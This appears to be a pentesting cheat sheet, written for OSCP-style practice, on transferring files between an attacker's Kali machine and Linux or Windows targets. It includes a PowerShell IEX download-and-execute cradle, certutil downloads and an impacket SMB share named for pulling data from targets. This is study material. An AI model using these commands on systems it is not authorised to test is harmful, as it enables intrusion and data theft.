### Transfer Files

#### Linux → Linux
- **HttpServer**
    - `Kali> python3 -m http.server 80` → Start HttpServer on current directory at port 80
	- `Target> wget http://<IP>/<file>` → Fetch file
	- `Target> curl http://<IP>/<file> -o <file-name>` → Fetch file
#### Linux → Windows
- **HttpServer**
    - `Kali> python3 -m http.server 80` → Start HttpServer on current directory at port 80
	- `cmd> certutil -urlcache -f http://<IP>/<file> <Path/to/file>` → Fetch file
	- `cmd> curl http://<IP>/<file> -o <file-name>` → Fetch file
	- `PS> iwr -uri http://<IP>/<file> -Outfile <file-name>` → Fetch file
	- `PS> IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/<file>')` → Fetch file
- **SmbServer**
	- With Authentication
	    - `Kali> sudo impacket-smbserver -smb2support -user abc -password abc SendMeDataNow $(pwd)`
		- `cmd> net use M: /delete`
		- `cmd> net use M: \\<Attacker-IP>\SendMeDataNow /user:abc abc`
        - `cmd> dir M:\`
        - `cmd> Copy M:\<file> <file-name>`
        - Alternative - Mount through powershell
        	```
        	$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
        	$cred = New-Object System.Management.Automation.PSCredential('<user>', $pass)
        	New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<AttackerIP>\<ShareName>" -Credential $cred
        	```
	- Without Authentication
		- `Kali> sudo impacket-smbserver -smb2support SendMeDataNow $(pwd)`
		- `cmd> net use M: /delete`
		- `cmd> net use M: \\<Attacker-IP>\SendMeDataNow`
        - `cmd> dir M:\`
        - `cmd> Copy M:\<file> <file-name>`
- **RDP Client**
    - `xfreerdp /v:<IP> /d:<domain> /u:<username> /p:<password> /w:1200 /h:700 +drive:<Path/for/shared/directory/on/target>,<Path/for/shared/directory/on/local/system>`
	- eg. `xfreerdp /v:172.16.206.12 /u:yoshi /p:Mushroom! /w:1200 /h:700 +drive:C:\Users\,/home/piyush/Documents/practice-OSCP/medtech` → Here, we use medtech on local system as shared directory that will appear on remote system at path - `C:\Users` 
#### Windows → Linux
- Use `SmbServer` from previous section.
- Use `RDP Client` from previous section.
- `impacket-psexec` , `impacket-wmiexec` , `evil-winrm` have there own commands to upload or download files
    - `upload <file>`
    - `download <file>`
#### Windows → Windows
- **SmbServer** → Powershell
    - Enumerate SMB Share on current system
        - `Get-SMBShare` → List of shares
		- `Get-SMBShare <share-name>` → Basic Information about share
		- `Get-SMBShare <share-name> | gm` → Detailed description (parameters) about share (get member)
		- `Get-SMBShare <share-name> | fl` → Basic information about share (format-list)
		- `Get-SMBShare <share-name> | fl *` → Detailed information about share (Parameter:Value)
		- `Get-SMBShareAccess <share-name>` → Shows user accounts that can access share
		- `Get-SMBShare | Get-SMBShareAccess` → Show user account access for all shares
            - `Get-SMBShare | Get-SMBShareAccess | format-table -groupby name`
	- Create New SMB Share → Administrator’s access
        - `Set-Location C:\` → Change Directory
		- `New-Item -ItemType directory SampleShare` → Create Directory
		- `Get-ChildItem` → List files in directory
		- `New-SMBShare Sample C:\SampleShare` → Create Share with name Sample pointing to location `C:\SampleShare`
		- `Set-SMBShare Sample -description "Sample share for demo"` → To Set Parameter Value for Sample
		- `Grant-SMBShareAccess Sample -AccountName 'Everyone' -AccessRight Full`
		- `Get-Command -noun SMBShare` → This helps us find command name like grep
		- `Remove-SmbShare Sample` → Remove Sample Share
	- Create New Sharable Directory → Non-Administrator
        - Create a directory → `Public`
		- Go to `Properties`  → `Sharing`  tab → Click `Share`
		- Select `Everyone` → By default `Read` Access is selected (But everyone only means all user accounts of your domain)
#### Some Awesome References
- [Different ways to transfer files from/to Linux (and Windows) machines (I)](https://medium.com/@drenfermo/different-ways-to-transfer-files-from-to-linux-and-windows-machines-i-9eebda7033fb)
- [Different ways to transfer files from/to Linux (and Windows) machines (II)](https://medium.com/@drenfermo/different-ways-to-transfer-files-from-to-linux-and-windows-machines-ii-a351b5a78811)
